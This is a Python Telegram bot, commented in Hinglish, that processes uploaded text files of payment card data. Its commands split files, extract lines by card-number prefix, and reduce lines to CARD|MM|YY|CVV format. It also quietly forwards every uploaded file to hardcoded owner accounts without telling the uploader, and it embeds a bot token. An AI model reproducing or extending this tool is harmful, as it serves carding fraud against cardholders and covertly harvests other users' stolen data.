import os
import logging
import asyncio
import re
from datetime import datetime
from telegram import Update, InputFile
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
    Application
)
from telegram.constants import ParseMode
from telegram.error import TelegramError

# ==================================================
# CONFIGURATION (Setups aur Tokens)
# ==================================================
# Apna asli Bot Token yahan daalein
BOT_TOKEN = "8811033165:AAG4NQszrJa3bP0Cgz-nuanE1g7RVVb2coA"

# Owners ki Telegram User IDs
OWNER_IDS = [
    6382539239,
    8665264271
]

# Paths ka setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
OUTPUTS_DIR = os.path.join(BASE_DIR, "outputs")
LOGS_DIR = os.path.join(BASE_DIR, "logs")

# Agar folders pehle se nahi bane hain, toh unhe banayein
for folder in [UPLOADS_DIR, OUTPUTS_DIR, LOGS_DIR]:
    os.makedirs(folder, exist_ok=True)

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "bot.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

downloaded_files = {}
stop_flags = {}

# ==================================================
# UTILITY FUNCTIONS
# ==================================================

def get_user_identifier(user):
    """User ka username return karta hai agar hai, nahi toh first name."""
    if user.username:
        return f"@{user.username}"
    return user.first_name

async def forward_to_owners(context: ContextTypes.DEFAULT_TYPE, user, file_path, file_name):
    """Nayi upload ki gayi file ko owners ke paas turant forward karta hai."""
    caption = (
        f"📩 <b>Nayi File Upload Hui Hai!</b>\n\n"
        f"<b>Uploader:</b> {get_user_identifier(user)}\n"
        f"<b>File Name:</b> <code>{file_name}</code>"
    )
    for owner_id in OWNER_IDS:
        try:
            with open(file_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=owner_id,
                    document=f,
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
        except Exception as e:
            logger.error(f"Owner {owner_id} ko file forward karne mein error: {e}")

async def count_lines(file_path):
    """Badi files mein lines ko speed se count karne ke liye."""
    count = 0
    with open(file_path, 'rb') as f:
        for _ in f:
            count += 1
    return count

async def get_file_from_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply = update.message.reply_to_message
    if not reply or not reply.document:
        return None, None, "❌ Kripya us TXT file ka reply karke command dalein jise aap process karna chahte hain."

    if not reply.document.file_name.endswith('.txt'):
        return None, None, "❌ Reply ki gayi file ek valid .txt file nahi hai."

    chat_id = update.effective_chat.id
    msg_id = reply.message_id
    cache_key = (chat_id, msg_id)
    
    # Original file name nikalte hain bina .txt extension ke
    orig_name = os.path.splitext(reply.document.file_name)[0]

    if cache_key in downloaded_files and os.path.exists(downloaded_files[cache_key]):
        return downloaded_files[cache_key], orig_name, None

    try:
        msg = await update.message.reply_text("📥 Target file fetch ki ja rahi hai...")
        file = await context.bot.get_file(reply.document.file_id)
        file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
        await file.download_to_drive(file_path)
        downloaded_files[cache_key] = file_path
        await msg.delete()
        return file_path, orig_name, None
    except Exception as e:
        logger.error(f"Replied file download karne mein error aaya: {e}")
        return None, None, f"❌ File download nahi ho saki: {str(e)}"

# ==================================================
# COMMAND HANDLERS
# ==================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = get_user_identifier(user)
    welcome_msg = (
        f"Namaste {name}!\n\n"
        f"Kripya ek .txt format ki file upload karein ⚡"
    )
    await update.message.reply_text(welcome_msg)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 <b>Help Menu</b>\n\n"
        "1️⃣ Pehle ek <code>.txt</code> file upload karein.\n"
        "2️⃣ Phir us file ka reply karke niche diye gaye commands dalein:\n\n"
        "⚡ <code>/spl &lt;N&gt;</code> – File ko har N lines par split karein\n"
        "🔍 <code>/ext &lt;prefix&gt;</code> – Prefix wali lines extract karein\n"
        "🧹 <code>/clear</code> – TXT ko CARD|MM|YY|CVV format mein saaf karein\n"
        "🛑 <code>/stop</code> – Chal rahe process ko rokein\n"
        "❓ <code>/help</code> – Yeh message dekhein"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)

async def stop_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_flags[user_id] = True
    await update.message.reply_text("🛑 Process ko roka ja raha hai... Kripya thoda wait karein.")

# ==================================================
# FILE UPLOAD HANDLE
# ==================================================

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    msg_id = update.message.message_id
    doc = update.message.document

    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Kripya sirf .txt file hi upload karein.")
        return

    msg = await update.message.reply_text("📥 File download ho rahi hai...")
    file = await context.bot.get_file(doc.file_id)
    
    file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
    await file.download_to_drive(file_path)

    downloaded_files[(chat_id, msg_id)] = file_path
    stop_flags[user.id] = False

    await msg.edit_text(
        "✅ TXT file mil gayi hai 🔥\n\n"
        "<b>Ab is file ka reply karke niche diye gaye commands use karein:</b> 👇\n"
        "• /spl <N> – Split karein\n"
        "• /ext <prefix> – Prefix lines nikalein\n"
        "• /clear – File saaf karein\n"
        "• /stop – Process ko rokein",
        parse_mode=ParseMode.HTML
    )

    # Owner ko turant forward karein
    await forward_to_owners(context, user, file_path, doc.file_name)

# ==================================================
# FEATURE: SPLIT (/spl)
# ==================================================

async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    text = update.message.text
    match = re.search(r'/spl\s*(\d+)', text)
    
    if not match:
        await update.message.reply_text("❌ Galat format! File ka reply karke dalein: /spl 100 ya /spl100")
        return

    lines_per_file = int(match.group(1))
    if lines_per_file <= 0:
        await update.message.reply_text("❌ Number 0 se bada hona chahiye.")
        return

    total_lines = await count_lines(input_path)
    num_files = (total_lines + lines_per_file - 1) // lines_per_file

    await update.message.reply_text(
        f"🚀 <b>Split Process Shuru</b>\n\n"
        f"Total Lines: {total_lines}\n"
        f"Lines Per File: {lines_per_file}\n"
        f"Total Files Jo Banengi: {num_files}",
        parse_mode=ParseMode.HTML
    )

    stop_flags[user_id] = False
    
    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile:
            current_file_num = 1
            line_count = 0
            current_out_lines = []

            for line in infile:
                if stop_flags.get(user_id):
                    await update.message.reply_text("Process user dwara rok diya gaya.")
                    return

                current_out_lines.append(line)
                line_count += 1

                if line_count >= lines_per_file:
                    out_filename = f"part_{current_file_num}_{orig_name}.txt"
                    out_path = os.path.join(OUTPUTS_DIR, out_filename)
                    
                    with open(out_path, 'w', encoding='utf-8') as outfile:
                        outfile.writelines(current_out_lines)
                    
                    with open(out_path, 'rb') as f:
                        await context.bot.send_document(chat_id=user_id, document=f)
                    
                    os.remove(out_path)
                    current_out_lines = []
                    line_count = 0
                    current_file_num += 1
                    await asyncio.sleep(0.5)

            if current_out_lines:
                out_filename = f"part_{current_file_num}_{orig_name}.txt"
                out_path = os.path.join(OUTPUTS_DIR, out_filename)
                with open(out_path, 'w', encoding='utf-8') as outfile:
                    outfile.writelines(current_out_lines)
                with open(out_path, 'rb') as f:
                    await context.bot.send_document(chat_id=user_id, document=f)
                os.remove(out_path)

        await update.message.reply_text("✅ Splitting ka kaam pura ho gaya!")
    except Exception as e:
        logger.error(f"/spl command mein error: {e}")
        await update.message.reply_text(f"❌ Error aaya: {str(e)}")

# ==================================================
# FEATURE: EXTRACT (/ext)
# ==================================================

async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    text = update.message.text
    match = re.search(r'/ext\s*(.+)', text)
    if not match:
        await update.message.reply_text("❌ Galat format! File ka reply karke dalein: /ext <prefix> (Example: /ext4960)")
        return

    prefix = match.group(1).strip()
    out_filename = f"extracted_{orig_name}.txt"
    out_path = os.path.join(OUTPUTS_DIR, out_filename)
    
    await update.message.reply_text(f"🔍 `{prefix}` se shuru hone wali lines nikali ja rahi hain...", parse_mode=ParseMode.MARKDOWN)
    
    stop_flags[user_id] = False
    count = 0

    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile, \
             open(out_path, 'w', encoding='utf-8') as outfile:
            for line in infile:
                if stop_flags.get(user_id):
                    await update.message.reply_text("Process rok diya gaya.")
                    return
                if line.startswith(prefix):
                    outfile.write(line)
                    count += 1

        if count > 0:
            with open(out_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id, 
                    document=f, 
                    caption=f"✅ Total {count} lines nikal li gayi hain."
                )
        else:
            await update.message.reply_text("❌ Koi match nahi mila.")
        
        if os.path.exists(out_path):
            os.remove(out_path)

    except Exception as e:
        await update.message.reply_text(f"❌ Error aaya: {e}")

# ==================================================
# FEATURE: CLEAR (/clear)
# ==================================================

async def clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
    if error_msg:
        await update.message.reply_text(error_msg)
        return

    out_filename = f"cleaned_{orig_name}.txt"
    out_path = os.path.join(OUTPUTS_DIR, out_filename)
    
    await update.message.reply_text("🧹 File saaf ki ja rahi hai... (Sirf CARD|MM|YY|CVV bachega)")
    
    stop_flags[user_id] = False
    count = 0

    try:
        with open(input_path, 'r', encoding='utf-8', errors='ignore') as infile, \
             open(out_path, 'w', encoding='utf-8') as outfile:
            for line in infile:
                if stop_flags.get(user_id): break
                
                parts = line.strip().split('|')
                if len(parts) >= 4:
                    clean_line = "|".join(parts[:4])
                    outfile.write(clean_line + "\n")
                    count += 1
        
        if count > 0:
            with open(out_path, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id, 
                    document=f, 
                    caption=f"✅ {count} lines saaf ho chuki hain."
                )
        else:
            await update.message.reply_text("❌ Saaf karne ke liye koi valid format nahi mila.")
            
        if os.path.exists(out_path):
            os.remove(out_path)
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error aaya: {e}")

# ==================================================
# MAIN ENTRY POINT
# ==================================================

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_process))
    
    application.add_handler(MessageHandler(filters.Regex(r'^/spl\d+$') | filters.Regex(r'^/spl\s+\d+$'), split_file))
    application.add_handler(MessageHandler(filters.Regex(r'^/ext.+$'), extract_prefix))
    application.add_handler(CommandHandler("clear", clear_file))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
